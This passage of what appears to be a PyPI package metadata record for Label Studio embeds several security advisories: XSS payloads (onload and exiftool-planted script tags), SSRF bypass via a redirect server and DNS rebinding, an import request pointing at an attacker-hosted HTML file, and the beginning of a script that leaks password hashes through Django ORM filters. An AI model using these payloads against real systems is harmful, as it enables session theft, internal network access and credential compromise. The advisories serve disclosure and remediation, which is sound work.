complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.8.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.8.2/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.54rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.8.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"0f2110bc75d2282d08002a2ca87f21269c1b48d0e50b50ec9b370ec6515addce","md5":"6d27b2866b39fb30bfbebbe0f5897cdd","sha256":"dcb192bbe048e3dfec4a9246bd03daabe0833fcdde85df4ae1731ee7519e7d1b"},"downloads":-1,"filename":"label_studio-1.8.2-py3-none-any.whl","has_sig":false,"md5_digest":"6d27b2866b39fb30bfbebbe0f5897cdd","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":53086394,"upload_time":"2023-08-29T15:58:07","upload_time_iso_8601":"2023-08-29T15:58:07.126507Z","url":"https://files.pythonhosted.org/packages/0f/21/10bc75d2282d08002a2ca87f21269c1b48d0e50b50ec9b370ec6515addce/label_studio-1.8.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"832b7a970b1d8e56ff8716828b7ce24d488515b0cb0151d46e07ecc29d7f41b8","md5":"8b2fbf4e9776be0570e041267bc201ca","sha256":"371597e73592f9849c9c903b452db36499dc9822c3da849a0c79b83e92c65116"},"downloads":-1,"filename":"label-studio-1.8.2.tar.gz","has_sig":false,"md5_digest":"8b2fbf4e9776be0570e041267bc201ca","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":52038415,"upload_time":"2023-08-29T15:58:11","upload_time_iso_8601":"2023-08-29T15:58:11.937318Z","url":"https://files.pythonhosted.org/packages/83/2b/7a970b1d8e56ff8716828b7ce24d488515b0cb0151d46e07ecc29d7f41b8/label-studio-1.8.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = 